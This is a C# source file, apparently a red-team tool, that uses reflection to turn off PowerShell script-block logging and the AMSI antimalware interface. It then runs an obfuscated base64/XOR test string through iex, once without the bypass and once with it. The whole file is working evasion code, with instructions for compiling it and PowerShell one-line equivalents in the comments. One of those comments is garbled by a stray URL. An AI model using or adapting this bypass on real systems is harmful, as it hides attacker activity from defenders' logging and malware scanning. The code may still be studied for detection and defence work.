using System;
using System.Management.Automation;
using System.Reflection;

namespace PSLoggingBypass
{
/*
One of the many ways one could disabled PS logging/AMSI if there's prior code execution.

Author: Lee Christensen (@tifkin_)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

Instructions:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe DisablePSLogging.cs /reference:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
*/
    class Program
    {
        public static void Main(string[] args)
        {
            // The code invokes the EICAR test string in order test AMSI
            string Command = @"
$ErrorActionPreference =  'Stop'
$base64 = 'FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ='
$bytes = [Convert]::FromBase64String($base64)
$string = -join ($bytes | % { [char] ($_ -bxor 0x33) })
iex $string 

[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); 
[System.Windows.Forms.MessageBox]::Show('Hello from PowerShell!');
";
            bool BypassAmsi = false;
            InvokePS(Command, BypassAmsi);

            Console.WriteLine("\nPress any key to test bypass...");
            Console.ReadKey();

            BypassAmsi = true;
            InvokePS(Command, BypassAmsi);
        }

        public static void InvokePS(string Command, bool BypassAmsi)
        {
            try
            {
                using (PowerShell PowerShellInstance = PowerShell.Create())
                {
                    // Disable ScriptBlockLogging
                    //
                    // In PowerShell:
                    // $EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');
                    // $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid());
                    // $EtwProvider.SetValue($null, $EventProvider);

                    var PSEtwLogProvider = PowerShellInstance.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                    if (PSEtwLogProvider != null)
                    {
                        var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                        var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                        EtwProvider.SetValue(null, EventProvider);
                    }

                    // Disable AMSI
                    // In PowerShell: [Ref].Assembly.GetType('http://System.Management .Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
                    var AmsiUtils = PowerShellInstance.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
                    if (AmsiUtils != null && BypassAmsi == true)
                    {
                        AmsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
                    }

                    PowerShellInstance.AddScript(Command);
                    PowerShellInstance.Invoke();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("ERRROR: " + e.Message);
            }
        }
    }
}
